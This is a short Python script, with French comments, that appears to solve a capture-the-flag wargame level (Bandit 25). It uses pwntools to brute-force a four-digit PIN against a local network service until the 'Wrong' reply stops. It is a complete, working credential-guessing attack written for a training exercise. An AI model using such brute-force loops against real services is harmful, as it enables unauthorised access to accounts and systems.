#!/usr/bin/env python3
"""
Bandit level 25 — même brute-force que level25_bruteforce_socket.py,
mais avec pwntools, la bibliothèque standard pour ce genre d'interaction
réseau en CTF (remote(), sendline(), recvline() gèrent les bytes et les
timeouts pour nous).

Usage :
    python3 level25_bruteforce_pwntools.py --host localhost --port 30002 \
        --password <mot_de_passe_du_niveau_precedent>
"""

import argparse

from pwn import remote, log


def brute_force(host: str, port: int, password: str) -> str | None:
    conn = remote(host, port)
    conn.recvline()  # message d'accueil

    for i in range(10000):
        pin = f"{i:04d}"
        conn.sendline(f"{password} {pin}".encode())
        response = conn.recvline()

        if b"Wrong" not in response:
            log.success(f"Pin trouvé : {pin}")
            print(response)
            print(conn.recvall(timeout=2))
            conn.close()
            return pin

    conn.close()
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="localhost", help="Hôte du service")
    parser.add_argument("--port", type=int, required=True, help="Port du service")
    parser.add_argument(
        "--password", required=True, help="Mot de passe trouvé au niveau précédent"
    )
    args = parser.parse_args()

    brute_force(args.host, args.port, args.password)


if __name__ == "__main__":
    main()
